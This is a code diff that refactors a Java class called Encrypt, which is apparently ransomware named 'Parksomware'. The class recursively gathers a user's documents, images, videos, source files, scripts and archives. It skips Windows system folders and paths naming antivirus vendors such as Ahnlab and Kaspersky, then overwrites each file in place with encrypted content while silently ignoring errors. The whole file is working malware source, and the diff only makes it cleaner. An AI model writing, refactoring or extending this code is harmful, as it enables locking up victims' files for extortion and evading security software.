@@ -5,12 +5,13 @@ import javax.crypto.spec.SecretKeySpec;
 import java.io.File;
 import java.io.FileWriter;
 import java.nio.file.Files;
+import java.nio.file.Path;
 import java.util.*;
 
 public class Encrypt {
 
     private static final String KEY = UUID.randomUUID().toString().replaceAll("-", "");
-    private static final String[] EXTENSIONS = new String[]{
+    private static final List<String> EXTENSIONS = Arrays.asList(
             ".doc", ".docx", ".pdf", ".txt", ".ppt", ".pptx", ".xls", ".xlsx", ".csv",
             ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".tiff", ".svg",
             ".mp4", ".avi", ".mov", ".wmv", ".flv", ".swf", ".mkv",
@@ -19,9 +20,9 @@ public class Encrypt {
             ".html", ".css", ".scss", ".less", ".ts", ".vue", ".json", ".xml",
             ".sh", ".bat", ".cmd", ".ps1",
             ".zip", ".rar", ".7z", ".tar", ".gz", ".bz2", ".xz"
-    };
+    );
 
-    private static final String[] EXCLUDED_FOLDERS = new String[]{
+    private static final List<String> EXCLUDED_FOLDERS = Arrays.asList(
             "C:\\Windows",
             System.getenv("APPDATA") + "\\Parksomware",
             "C:\\$Recycle.Bin",
@@ -29,15 +30,20 @@ public class Encrypt {
             "C:\\Program Files",
             "C:\\Program Files (x86)",
             System.getenv("userprofile") + "\\Appdata\\Local"
-    };
+    );
 
-    private static final String[] EXCLUDED_KEYWORDS = {
+    private static final List<String> EXCLUDED_KEYWORDS = Arrays.asList(
             "Estsoft",
             "Ahnlab",
             "Kaspersky Lab",
             "Windows",
             "Microsoft"
-    };
+    );
+
+    public static void main() {
+        runEncryption();
+        System.out.println("KEY = " + KEY);
+    }
 
     public static void runEncryption() {
         List<File> filesToEncrypt = new ArrayList<>();
@@ -70,19 +76,7 @@ public class Encrypt {
     private static void collectFiles(File directory, List<File> files) {
         String dirPath = directory.getAbsolutePath();
 
-        for (String excludedFolder : EXCLUDED_FOLDERS) {
-            if (dirPath.toLowerCase().startsWith(excludedFolder.toLowerCase())) {
-                return;
-            }
-        }
-
-        for (String keyword : EXCLUDED_KEYWORDS) {
-            if (dirPath.toLowerCase().contains(keyword.toLowerCase())) {
-                return;
-            }
-        }
-
-        if (dirPath.matches(".*[^a-zA-Z0-9\\\\\\/: \\-_.()\\[\\]{}~\\uAC00-\\uD7AF].*")) {
+        if (isExcludedFolder(dirPath) || containsExcludedKeyword(dirPath) || containsSpecialCharacters(dirPath)) {
             return;
         }
 
@@ -92,22 +86,37 @@ public class Encrypt {
                 if (file.isDirectory()) {
                     collectFiles(file, files);
                 } else {
-                    for (String extension : EXTENSIONS) {
-                        if (file.getName().toLowerCase().endsWith(extension)) {
-                            files.add(file);
-                            break;
-                        }
+                    if (hasValidExtension(file.getName())) {
+                        files.add(file);
                     }
                 }
             }
         }
     }
 
-    private static void encryptFile(File file) throws Exception {
+    private static boolean isExcludedFolder(String dirPath) {
+        return EXCLUDED_FOLDERS.stream().anyMatch(folder -> dirPath.toLowerCase().startsWith(folder.toLowerCase()));
+    }
+
+    private static boolean containsExcludedKeyword(String dirPath) {
+        return EXCLUDED_KEYWORDS.stream().anyMatch(keyword -> dirPath.toLowerCase().contains(keyword.toLowerCase()));
+    }
+
+    private static boolean containsSpecialCharacters(String dirPath) {
+        return dirPath.matches(".*[^a-zA-Z0-9\\\\\\/: \\-_.()\\[\\]{}~\\uAC00-\\uD7AF].*");
+    }
+
+    private static boolean hasValidExtension(String fileName) {
+        String lowerCaseFileName = fileName.toLowerCase();
+        return EXTENSIONS.stream().anyMatch(extension -> lowerCaseFileName.endsWith(extension));
+    }
+
+    private static void encryptFile(File file) {
         try {
-            byte[] fileContent = Files.readAllBytes(file.toPath());
+            Path filePath = file.toPath();
+            byte[] fileContent = Files.readAllBytes(filePath);
             byte[] encryptedContent = encrypt(fileContent);
-            Files.write(file.toPath(), encryptedContent);
+            Files.write(filePath, encryptedContent);
         } catch (Exception ignored) {
         }
     }
